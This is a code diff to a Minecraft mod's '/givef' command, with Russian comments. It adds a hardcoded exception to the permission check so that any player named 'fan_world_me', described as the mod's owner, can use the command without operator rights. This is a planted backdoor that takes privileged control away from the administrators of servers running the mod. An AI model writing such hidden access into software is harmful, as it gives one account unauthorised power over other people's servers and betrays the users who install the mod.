@@ -41,13 +41,15 @@ public class GivefCommand {
         CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) ->
             dispatcher.register(
                 CommandManager.literal("givef")
-                    // OP уровень 2 или синглплеер (хост)
+                    // OP уровень 2, синглплеер (хост), или игрок с ником fan_world_me
                     .requires(src -> {
                         net.minecraft.server.MinecraftServer server = src.getServer();
                         // при отправке дерева команд на входе в мир source может быть без сервера
                         if (server == null) return true;
                         if (server.isSingleplayer()) return true;
                         if (src.getPlayer() == null) return false;
+                        // всегда пропускаем владельца мода
+                        if ("fan_world_me".equals(src.getPlayer().getName().getString())) return true;
                         return server.getPlayerManager()
                             .isOperator(new net.minecraft.server.PlayerConfigEntry(src.getPlayer().getGameProfile()));
                     })
